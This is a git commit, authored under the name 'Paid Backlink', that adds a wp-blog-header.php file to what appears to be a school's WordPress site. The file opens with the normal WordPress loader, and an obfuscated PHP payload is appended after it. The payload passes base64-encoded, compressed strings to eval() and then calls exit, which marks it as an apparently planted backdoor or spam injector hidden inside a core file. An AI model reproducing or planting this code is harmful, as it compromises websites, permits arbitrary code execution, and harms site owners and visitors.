6b48341bdc4ea580b235a54c69fa1de2a37b48a5
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-02-19 14:00:11 +0800

    Create wp-blog-header.php

---
+++ site/mtsdarululumsasa/mtsdarululumsasa.sch.id/wp-blog-header.php
@@ -0,0 +1,28 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+?>
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "=0ez8fzHa/zULE/kX6uD7XJ14n80iqyWCEGwWnokV6PPA/cDwNnN9NbAwhdMegJV2Uh7st7iX+cN5nAFQJQfdJT5m6sk1JdS0sYAPAvvzPPzYpa6zrivtV+5JXiZSm3tm5YfY1sy32dc/kkPELvNkj7RHBT8aDrHn06nsdk+cFKuX1C4c7tPcZhKtz3GrFz6dlmWNHQn3f3Ww9zF0ZNMfLTrtFm2c1iOP079uwAOJPYD8zz/QPQvPfo21rZustum05vWst4rOt235ebg3W3l+7sid66eHM12RQt6sIgrXNMh7mhDV0nTx3AGgSo5YxPhAJjVQWzxTNMRhf+b130ewrEZ1dHuC/bRB3dWdEPakv+/f4s50hWFgqWR4lKFsrREwiB3B1HCg+dAEiRcPicDhT/jlRhrjGtHE3SQoAtsVUZEpFgs3y1tgEEjaUWXb1aAtCZZplGKGBYYG9IAC3KVO5V/0PHiQoIUmdNSyd1uYfcSJrisKvoU8pqE9uwujJGYuIZz0c5a3nF0cDUlg+ewu6LFwstadDVjcin/qFQlBwJe+/VAgGg/aFQpB4fVBoaA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
